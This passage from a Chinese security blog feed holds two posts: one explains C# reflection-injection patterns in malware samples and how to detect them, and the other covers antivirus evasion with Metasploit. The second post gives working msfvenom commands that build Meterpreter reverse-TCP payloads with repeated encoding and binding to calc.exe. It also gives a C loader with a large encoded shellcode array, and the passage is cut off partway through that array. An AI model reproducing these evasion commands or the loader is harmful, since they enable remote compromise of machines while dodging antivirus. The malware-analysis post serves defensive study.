    <content type="html"><![CDATA[<h2 id="0x00-C-反射注入总结"><a href="#0x00-C-反射注入总结" class="headerlink" title="0x00 C# 反射注入总结"></a>0x00 C# 反射注入总结</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;反射的流程一共有3种类型：CreateInstance类型，CallByName类型，Invoke类型。<br><a id="more"></a></p><h2 id="0x01-CreateInstance类型"><a href="#0x01-CreateInstance类型" class="headerlink" title="0x01 CreateInstance类型"></a>0x01 CreateInstance类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;采用CreateInstance的C#反射，最终会通过调用Activator.CreateInstance实现反射注入的目的，在C#中CreateInstance函数具有多种重载，其中被使用于C#的是如下原型:第一个参数为type，表示需要创建的Object的类型，第二个参数是有对象组成的数组。<br><figure class="highlight delphi"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">object</span>? CreateInstance (<span class="keyword">Type</span> <span class="keyword">type</span>, params <span class="keyword">object</span>?[]? args);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以采用CallByName函数获取对象的类型，CallByName可以在对象上执行方法，设置或者返回属性。<br>其函数原型如下：</p><ul><li>ObjectRef：是对于某个对象的引用</li><li>ProcName:对象上的函数或者方法名，<strong><em>此处在反射中一般使用GetType</em></strong></li><li>UseCallType:一个枚举类型</li><li>Args：一个对象数组<figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">object</span>? CallByName (<span class="keyword">object</span>? ObjectRef, <span class="keyword">string</span> ProcName, Microsoft.VisualBasic.CallType UseCallType, <span class="keyword">params</span> <span class="keyword">object</span>?[] Args);</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CallByName第一个参数是ObjectRef，可以使用GetObjectValue获取，微软的解释，该函数的作用为<strong><em>Boxes a value type.</em></strong>，查看下面的返回值信息，可以了解，该函数可以返回Object本身（obj itself）<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">object</span>? GetObjectValue (<span class="keyword">object</span>? obj);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如此，整个逻辑就清楚了，首先通过GetObjectValue函数，创建一个Object，接着调用CallByName函数，或者该对象的类型，最后调用CreateInstance创建一个实例，完成反射。<strong><em>整个流程最终会通过调用CreateInstance实现，所以可以直接搜索该函数来提高分析进度</em></strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图，通过搜索CreateInstance，借助Dnspy的分析功能，得到该样本反射注入的流程【图1】，通过分析在public DebuggableAttribute函数中，分别调用了az()函数，和imimimimim()函数，imimimimim()函数最终调用CreateInstance创建实例，而az()函数会调用xxxxxxxxxxxxxxxxxx()函数，</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在xxxxxxxxxxxxxxxxxx()函数中，正如之前所说，会一次调用RuntimeHelpers.GetObjectValue(object_0)和Versioned.CallByName(object_0, string_0, callType_0, object_1)【分别在smethod_6和smethod_5中】;可以看到在smethod_6中，Args的反射注入特征很明显【图2】：</p><ul><li>第一：new了一个对象，这其实是反射加载的程序集</li><li>第二：第一个参数为load字符串。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而在smethod_5中，new的object为一个字符串，实际是加载程序集的所在的class。上述都可以作为快速确定是否是C#反射的特征【图3】</p><h2 id="0x02-CallByName类型"><a href="#0x02-CallByName类型" class="headerlink" title="0x02 CallByName类型"></a>0x02 CallByName类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之前讲过，CallByName可以执行对象上的方法，如图所示，首先加载了位于资源文件中的图片资源，然后通过 MessageEnum.fgh进行解密，得到字节数组，之后便调用 AppDomain.CurrentDomain.Load()进行加载，接着分别调用GetTypes()，GetMethods()获取方法，然后采用CallByName执行【图4】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种类型可以通过Load()函数进行识别，亦可通过CallByName(),GetTypes()识别</p><h2 id="0x02-Invoke类型"><a href="#0x02-Invoke类型" class="headerlink" title="0x02 Invoke类型"></a>0x02 Invoke类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke()方法，可以执行指定的方法，如图所示，在smethod_58()最终调用Load()方法加载程序及，然后经过校验入口点之后，在smethod_61调用Invoke进行反射。【图5】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种类型可以通过Load()方法和Invoke()方法进行识别。除此以外，还可以通过GetMethod函数获取Method，然后Invoke。</p><h2 id="0x04-InvokeMember类型"><a href="#0x04-InvokeMember类型" class="headerlink" title="0x04 InvokeMember类型"></a>0x04 InvokeMember类型</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InvokeMember()，可以执行指定的方法，和Invoke功能一样。如图所示，首先通过Load()加载程序集，然后调用GetTypes()获取类型，接着调用InvokeMember执行指定的函数。【图6】</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种类型和上述一样，可以通过Load()方法，GetTypes()方法，以及InvokeMember()方法进行识别，亦可通过InvokeMember方法的参数BindingFlags.InvokeMethod方法进行识别。</p><p>Ref:<a href="http://hskull.cn/2021/01/01/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%901/#%E6%A0%B7%E6%9C%AC%E8%87%AA%E8%BA%AB%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90" target="_blank" rel="external">如何分析各种类型的恶意样本之–C#恶意样本分析技巧</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-C-反射注入总结&quot;&gt;&lt;a href=&quot;#0x00-C-反射注入总结&quot; class=&quot;headerlink&quot; title=&quot;0x00 C# 反射注入总结&quot;&gt;&lt;/a&gt;0x00 C# 反射注入总结&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;反射的流程一共有3种类型：CreateInstance类型，CallByName类型，Invoke类型。&lt;br&gt;
    
    </summary>
    
      <category term="病毒分析" scheme="https://findream.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>Metasploit免杀和检测的一些思考</title>
    <link href="https://findream.github.io/2021/04/05/Metasploit%E5%85%8D%E6%9D%80%E5%92%8C%E6%A3%80%E6%B5%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B0%E6%80%9D%E8%80%83/"/>
    <id>https://findream.github.io/2021/04/05/Metasploit免杀和检测的一些新思考/</id>
    <published>2021-04-05T07:02:11.000Z</published>
    <updated>2021-11-02T13:51:39.340Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。<br><a id="more"></a></p><h2 id="0x1-Metasploit基础知识"><a href="#0x1-Metasploit基础知识" class="headerlink" title="0x1 Metasploit基础知识"></a>0x1 Metasploit基础知识</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Metasploit Framework 简称msf，是一款开源的渗透测试平台框架，其开源地址位于<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework</a>。Metasploit是跨平台的渗透测试框架，可以运行在windows，linux，macos操作系统下。以kali为例，Metasploit的路径位于/usr/share/metasploit-framework。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lib目录包含metasploit的一些基本库文件，其中值得关注的是msf。这些主要是实现Metasploit的主要代码。<br>   <img src="http://hacky.wang/blog/20210504/Xbwd6zxypVJ3.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;modules目录包含了渗透测试各个环节功能的模块，包含辅助模块(auxiliary)，渗透攻击模块(exploits),后渗透攻击模块(post)，空指令模块(nops)和编码器模块(encoders)。<br>   <img src="http://hacky.wang/blog/20210504/71pFr6T8OILN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有其他一些目录：plugins，tools，script等也同样重要，可以阅读《Metasploit渗透测试魔鬼训练营》进行了解。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Metasploit的payload(载荷)从传输模式上一共分为3种: singles(独立载荷)，stagers(传输器载荷),stage(传输体)。关于这三种载荷的区别很多文章也有提及。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msfvenom是Metasploit的免杀模块，具体使用方法如下：<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Options:    </div><div class="line">-<span class="ruby">p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;<span class="comment">#039;-&amp;#039;或者stdin指定     </span></span></div><div class="line"><span class="ruby">-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all     </span></div><div class="line"><span class="ruby">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度     </span></div><div class="line"><span class="ruby">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)     </span></div><div class="line"><span class="ruby">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）     </span></div><div class="line"><span class="ruby">-a, --arch       &lt;architecture&gt;  指定payload的目标架构，这里x86是<span class="number">32</span>位，x64是<span class="number">64</span>位      </span></div><div class="line"><span class="ruby">-platform       &lt;platform&gt;      指定payload的目标平台     </span></div><div class="line"><span class="ruby">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度     </span></div><div class="line"><span class="ruby">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;<span class="comment">#039;\x00\xff&amp;#039;     </span></span></div><div class="line"><span class="ruby">-i, --iterations &lt;count&gt;         指定payload的编码次数     </span></div><div class="line"><span class="ruby">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件     </span></div><div class="line"><span class="ruby">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板     </span></div><div class="line"><span class="ruby">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行         </span></div><div class="line"><span class="ruby">--payload-options                列举payload的标准选项     </span></div><div class="line"><span class="ruby">-o, --out        &lt;path&gt;          保存payload     </span></div><div class="line"><span class="ruby">-v, --var-name   &lt;name&gt;          指定一个自定义的变量，以确定输出格式         </span></div><div class="line"><span class="ruby">--shellest                       最小化生成payload     </span></div><div class="line"><span class="ruby">-h, --help                       查看帮助选项         </span></div><div class="line"><span class="ruby">--help-formats                   查看msf支持的输出格式列表</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而现在常见的免杀套路主要是以下几种类型：</p><ul><li>采用自编码的免杀方案</li><li>捆绑正常的软件的免杀方案</li><li>捆绑加自编码的免杀方案</li><li>多重编码的免杀方案</li><li>生成shellcode的免杀方案</li></ul><h2 id="0x2-我的免杀学习之路"><a href="#0x2-我的免杀学习之路" class="headerlink" title="0x2 我的免杀学习之路"></a>0x2 我的免杀学习之路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文采用最常见的payload：windows/meterpreter/reverse_tcp。测试免杀的效果。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，采用自编码的免杀方案，这个方案的免杀强度取决于编码器的加密强度。但是随着yara规则的使用，单纯的依靠编码器进行免杀已经很容易被查杀了。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.199.237 -e x86/shikata_ga_nai -b '\x00' -i 10 -f exe &gt; reverse_tcp_encoder.exe</span></div><div class="line">No <span class="built_in">platform</span> was selected, choosing Msf::Module::Platform::Windows <span class="built_in">from</span> <span class="keyword">the</span> payload</div><div class="line">No Arch selected, selecting Arch: x86 <span class="built_in">from</span> <span class="keyword">the</span> payload</div><div class="line">Found <span class="number">1</span> compatible encoders</div><div class="line">Attempting <span class="built_in">to</span> encode payload <span class="keyword">with</span> <span class="number">10</span> iterations <span class="keyword">of</span> x86/shikata_ga_nai</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">360</span> (iteration=<span class="number">0</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">387</span> (iteration=<span class="number">1</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">414</span> (iteration=<span class="number">2</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">441</span> (iteration=<span class="number">3</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">468</span> (iteration=<span class="number">4</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">495</span> (iteration=<span class="number">5</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">522</span> (iteration=<span class="number">6</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">549</span> (iteration=<span class="number">7</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">576</span> (iteration=<span class="number">8</span>)</div><div class="line">x86/shikata_ga_nai succeeded <span class="keyword">with</span> size <span class="number">603</span> (iteration=<span class="number">9</span>)</div><div class="line">x86/shikata_ga_nai chosen <span class="keyword">with</span> final size <span class="number">603</span></div><div class="line">Payload size: <span class="number">603</span> <span class="keyword">bytes</span></div><div class="line">Final size <span class="keyword">of</span> exe <span class="built_in">file</span>: <span class="number">73802</span> <span class="keyword">bytes</span></div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20210505/rtFOkjfDht9E.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基于捆绑正常软件的免杀方案也有着不错的免杀效果，但是还有继续改进的余地。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.199.237 -x Desktop/calc.exe -f exe &gt; Documents/reverse_tcp_kunbang.exe</div><div class="line"><span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="keyword">from</span> the payload</div><div class="line"><span class="literal">No</span> Arch selected, selecting Arch: x86 <span class="keyword">from</span> the payload</div><div class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</div><div class="line">Payload size: 333 bytes</div><div class="line">Final size of exe file: 26112 bytes</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20210505/v77hAFEmNgTS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用多编码形式的shellcode生成的msfvenom<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">237.128</span> LPORT=<span class="number">4444</span> -e <span class="keyword">x</span><span class="number">86</span>/shikata_ga_nai -i <span class="number">3</span> -b '\<span class="keyword">x</span><span class="number">00</span>' -f raw | msfvenom -e <span class="keyword">x</span><span class="number">86</span>/countdown -i <span class="number">3</span> -a <span class="keyword">x</span><span class="number">86</span> --platform windows -f <span class="keyword">c</span> &gt; Desktop/payload<span class="number">2</span>.<span class="keyword">c</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后将其编译成可执行文件，执行，但效果也不是很好<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">#pragma comment(linker, "/section:.data,RWE")  </div><div class="line">unsigned char lpBinBuffer[] =</div><div class="line">"<span class="symbol">\x</span>b9<span class="symbol">\x</span>c1<span class="symbol">\x</span>01<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>e8<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>c1<span class="symbol">\x</span>5e<span class="symbol">\x</span>30<span class="symbol">\x</span>4c<span class="symbol">\x</span>0e"</div><div class="line">"<span class="symbol">\x</span>07<span class="symbol">\x</span>e2<span class="symbol">\x</span>fa<span class="symbol">\x</span>b8<span class="symbol">\x</span>ad<span class="symbol">\x</span>02<span class="symbol">\x</span>04<span class="symbol">\x</span>05<span class="symbol">\x</span>ee<span class="symbol">\x</span>f8<span class="symbol">\x</span>f7<span class="symbol">\x</span>f6<span class="symbol">\x</span>f5<span class="symbol">\x</span>ca<span class="symbol">\x</span>52"</div><div class="line">"<span class="symbol">\x</span>3d<span class="symbol">\x</span>42<span class="symbol">\x</span>01<span class="symbol">\x</span>17<span class="symbol">\x</span>f3<span class="symbol">\x</span>e8<span class="symbol">\x</span>ab<span class="symbol">\x</span>8b<span class="symbol">\x</span>17<span class="symbol">\x</span>12<span class="symbol">\x</span>12<span class="symbol">\x</span>f6<span class="symbol">\x</span>e1<span class="symbol">\x</span>ed<span class="symbol">\x</span>ed"</div><div class="line">"<span class="symbol">\x</span>e9<span class="symbol">\x</span>d7<span class="symbol">\x</span>4c<span class="symbol">\x</span>22<span class="symbol">\x</span>62<span class="symbol">\x</span>20<span class="symbol">\x</span>35<span class="symbol">\x</span>d0<span class="symbol">\x</span>cc<span class="symbol">\x</span>ee<span class="symbol">\x</span>f0<span class="symbol">\x</span>e8<span class="symbol">\x</span>4e<span class="symbol">\x</span>1f<span class="symbol">\x</span>c0"</div><div class="line">"<span class="symbol">\x</span>8b<span class="symbol">\x</span>98<span class="symbol">\x</span>db<span class="symbol">\x</span>22<span class="symbol">\x</span>dc<span class="symbol">\x</span>78<span class="symbol">\x</span>10<span class="symbol">\x</span>d5<span class="symbol">\x</span>ac<span class="symbol">\x</span>67<span class="symbol">\x</span>36<span class="symbol">\x</span>72<span class="symbol">\x</span>1b<span class="symbol">\x</span>89<span class="symbol">\x</span>c9"</div><div class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>06<span class="symbol">\x</span>7c<span class="symbol">\x</span>19<span class="symbol">\x</span>ea<span class="symbol">\x</span>5a<span class="symbol">\x</span>2c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>c6<span class="symbol">\x</span>8c<span class="symbol">\x</span>f6<span class="symbol">\x</span>fd<span class="symbol">\x</span>43<span class="symbol">\x</span>ca"</div><div class="line">"<span class="symbol">\x</span>2a<span class="symbol">\x</span>8e<span class="symbol">\x</span>a9<span class="symbol">\x</span>2c<span class="symbol">\x</span>ec<span class="symbol">\x</span>cb<span class="symbol">\x</span>fe<span class="symbol">\x</span>45<span class="symbol">\x</span>c0<span class="symbol">\x</span>ec<span class="symbol">\x</span>5b<span class="symbol">\x</span>7e<span class="symbol">\x</span>2d<span class="symbol">\x</span>fa<span class="symbol">\x</span>99"</div><div class="line">"<span class="symbol">\x</span>fc<span class="symbol">\x</span>eb<span class="symbol">\x</span>48<span class="symbol">\x</span>95<span class="symbol">\x</span>2a<span class="symbol">\x</span>41<span class="symbol">\x</span>40<span class="symbol">\x</span>df<span class="symbol">\x</span>f8<span class="symbol">\x</span>18<span class="symbol">\x</span>be<span class="symbol">\x</span>49<span class="symbol">\x</span>6c<span class="symbol">\x</span>29<span class="symbol">\x</span>eb"</div><div class="line">"<span class="symbol">\x</span>d2<span class="symbol">\x</span>91<span class="symbol">\x</span>c6<span class="symbol">\x</span>94<span class="symbol">\x</span>2e<span class="symbol">\x</span>74<span class="symbol">\x</span>5a<span class="symbol">\x</span>05<span class="symbol">\x</span>4f<span class="symbol">\x</span>e5<span class="symbol">\x</span>1d<span class="symbol">\x</span>b4<span class="symbol">\x</span>47<span class="symbol">\x</span>31<span class="symbol">\x</span>ca"</div><div class="line">"<span class="symbol">\x</span>e9<span class="symbol">\x</span>dc<span class="symbol">\x</span>3a<span class="symbol">\x</span>42<span class="symbol">\x</span>69<span class="symbol">\x</span>a0<span class="symbol">\x</span>a5<span class="symbol">\x</span>2d<span class="symbol">\x</span>4f<span class="symbol">\x</span>74<span class="symbol">\x</span>99<span class="symbol">\x</span>87<span class="symbol">\x</span>e4<span class="symbol">\x</span>08<span class="symbol">\x</span>b5"</div><div class="line">"<span class="symbol">\x</span>52<span class="symbol">\x</span>e6<span class="symbol">\x</span>0c<span class="symbol">\x</span>97<span class="symbol">\x</span>50<span class="symbol">\x</span>d9<span class="symbol">\x</span>7b<span class="symbol">\x</span>71<span class="symbol">\x</span>d7<span class="symbol">\x</span>40<span class="symbol">\x</span>46<span class="symbol">\x</span>71<span class="symbol">\x</span>48<span class="symbol">\x</span>a9<span class="symbol">\x</span>a0"</div><div class="line">"<span class="symbol">\x</span>4c<span class="symbol">\x</span>e2<span class="symbol">\x</span>92<span class="symbol">\x</span>51<span class="symbol">\x</span>f9<span class="symbol">\x</span>5f<span class="symbol">\x</span>98<span class="symbol">\x</span>52<span class="symbol">\x</span>97<span class="symbol">\x</span>82<span class="symbol">\x</span>63<span class="symbol">\x</span>a2<span class="symbol">\x</span>4d<span class="symbol">\x</span>ec<span class="symbol">\x</span>ee"</div><div class="line">"<span class="symbol">\x</span>e2<span class="symbol">\x</span>04<span class="symbol">\x</span>d9<span class="symbol">\x</span>36<span class="symbol">\x</span>19<span class="symbol">\x</span>94<span class="symbol">\x</span>dd<span class="symbol">\x</span>9d<span class="symbol">\x</span>bf<span class="symbol">\x</span>30<span class="symbol">\x</span>5f<span class="symbol">\x</span>50<span class="symbol">\x</span>22<span class="symbol">\x</span>91<span class="symbol">\x</span>7a"</div><div class="line">"<span class="symbol">\x</span>24<span class="symbol">\x</span>0b<span class="symbol">\x</span>d0<span class="symbol">\x</span>8a<span class="symbol">\x</span>bd<span class="symbol">\x</span>41<span class="symbol">\x</span>39<span class="symbol">\x</span>96<span class="symbol">\x</span>b8<span class="symbol">\x</span>8d<span class="symbol">\x</span>88<span class="symbol">\x</span>a7<span class="symbol">\x</span>8b<span class="symbol">\x</span>a5<span class="symbol">\x</span>4c"</div><div class="line">"<span class="symbol">\x</span>7e<span class="symbol">\x</span>c6<span class="symbol">\x</span>64<span class="symbol">\x</span>54<span class="symbol">\x</span>b1<span class="symbol">\x</span>f1<span class="symbol">\x</span>5b<span class="symbol">\x</span>e4<span class="symbol">\x</span>a6<span class="symbol">\x</span>7c<span class="symbol">\x</span>82<span class="symbol">\x</span>d1<span class="symbol">\x</span>47<span class="symbol">\x</span>8d<span class="symbol">\x</span>5e"</div><div class="line">"<span class="symbol">\x</span>eb<span class="symbol">\x</span>71<span class="symbol">\x</span>73<span class="symbol">\x</span>8a<span class="symbol">\x</span>87<span class="symbol">\x</span>d3<span class="symbol">\x</span>52<span class="symbol">\x</span>6a<span class="symbol">\x</span>69<span class="symbol">\x</span>49<span class="symbol">\x</span>e7<span class="symbol">\x</span>db<span class="symbol">\x</span>a5<span class="symbol">\x</span>92<span class="symbol">\x</span>4e"</div><div class="line">"<span class="symbol">\x</span>b9<span class="symbol">\x</span>0c<span class="symbol">\x</span>8f<span class="symbol">\x</span>6b<span class="symbol">\x</span>56<span class="symbol">\x</span>83<span class="symbol">\x</span>5c<span class="symbol">\x</span>a1<span class="symbol">\x</span>7c<span class="symbol">\x</span>d6<span class="symbol">\x</span>af<span class="symbol">\x</span>3b<span class="symbol">\x</span>78<span class="symbol">\x</span>40<span class="symbol">\x</span>68"</div><div class="line">"<span class="symbol">\x</span>85<span class="symbol">\x</span>95<span class="symbol">\x</span>17<span class="symbol">\x</span>d2<span class="symbol">\x</span>33<span class="symbol">\x</span>51<span class="symbol">\x</span>d8<span class="symbol">\x</span>eb<span class="symbol">\x</span>b7<span class="symbol">\x</span>41<span class="symbol">\x</span>e0<span class="symbol">\x</span>d3<span class="symbol">\x</span>a7<span class="symbol">\x</span>d5<span class="symbol">\x</span>59"</div><div class="line">"<span class="symbol">\x</span>6b<span class="symbol">\x</span>67<span class="symbol">\x</span>3d<span class="symbol">\x</span>cf<span class="symbol">\x</span>1d<span class="symbol">\x</span>d8<span class="symbol">\x</span>89<span class="symbol">\x</span>d5<span class="symbol">\x</span>0d<span class="symbol">\x</span>d3<span class="symbol">\x</span>8b<span class="symbol">\x</span>4a<span class="symbol">\x</span>16<span class="symbol">\x</span>33<span class="symbol">\x</span>03"</div><div class="line">"<span class="symbol">\x</span>d2<span class="symbol">\x</span>33<span class="symbol">\x</span>e7<span class="symbol">\x</span>8a<span class="symbol">\x</span>92<span class="symbol">\x</span>68<span class="symbol">\x</span>81<span class="symbol">\x</span>c3<span class="symbol">\x</span>26<span class="symbol">\x</span>d1<span class="symbol">\x</span>65<span class="symbol">\x</span>52<span class="symbol">\x</span>25<span class="symbol">\x</span>20<span class="symbol">\x</span>7b"</div><div class="line">"<span class="symbol">\x</span>b2<span class="symbol">\x</span>6f<span class="symbol">\x</span>8b<span class="symbol">\x</span>43<span class="symbol">\x</span>c4<span class="symbol">\x</span>4c<span class="symbol">\x</span>e7<span class="symbol">\x</span>80<span class="symbol">\x</span>90<span class="symbol">\x</span>16<span class="symbol">\x</span>e3<span class="symbol">\x</span>a7<span class="symbol">\x</span>da<span class="symbol">\x</span>71<span class="symbol">\x</span>82"</div><div class="line">"<span class="symbol">\x</span>8a<span class="symbol">\x</span>c7<span class="symbol">\x</span>5f<span class="symbol">\x</span>af<span class="symbol">\x</span>a0<span class="symbol">\x</span>47<span class="symbol">\x</span>1a<span class="symbol">\x</span>6c<span class="symbol">\x</span>8f<span class="symbol">\x</span>90<span class="symbol">\x</span>dc<span class="symbol">\x</span>79<span class="symbol">\x</span>52<span class="symbol">\x</span>84<span class="symbol">\x</span>30"</div><div class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>d3<span class="symbol">\x</span>45<span class="symbol">\x</span>82<span class="symbol">\x</span>80<span class="symbol">\x</span>86<span class="symbol">\x</span>7f<span class="symbol">\x</span>cb<span class="symbol">\x</span>52<span class="symbol">\x</span>29<span class="symbol">\x</span>64<span class="symbol">\x</span>51<span class="symbol">\x</span>03<span class="symbol">\x</span>5d<span class="symbol">\x</span>cb"</div><div class="line">"<span class="symbol">\x</span>db<span class="symbol">\x</span>13<span class="symbol">\x</span>80<span class="symbol">\x</span>9c<span class="symbol">\x</span>1a<span class="symbol">\x</span>46<span class="symbol">\x</span>d1<span class="symbol">\x</span>d5<span class="symbol">\x</span>58<span class="symbol">\x</span>30<span class="symbol">\x</span>79<span class="symbol">\x</span>d6<span class="symbol">\x</span>69<span class="symbol">\x</span>32<span class="symbol">\x</span>4e"</div><div class="line">"<span class="symbol">\x</span>7f<span class="symbol">\x</span>8a<span class="symbol">\x</span>ab<span class="symbol">\x</span>13<span class="symbol">\x</span>14<span class="symbol">\x</span>97<span class="symbol">\x</span>5d<span class="symbol">\x</span>96<span class="symbol">\x</span>ef<span class="symbol">\x</span>7c<span class="symbol">\x</span>3a<span class="symbol">\x</span>0e<span class="symbol">\x</span>03<span class="symbol">\x</span>d4<span 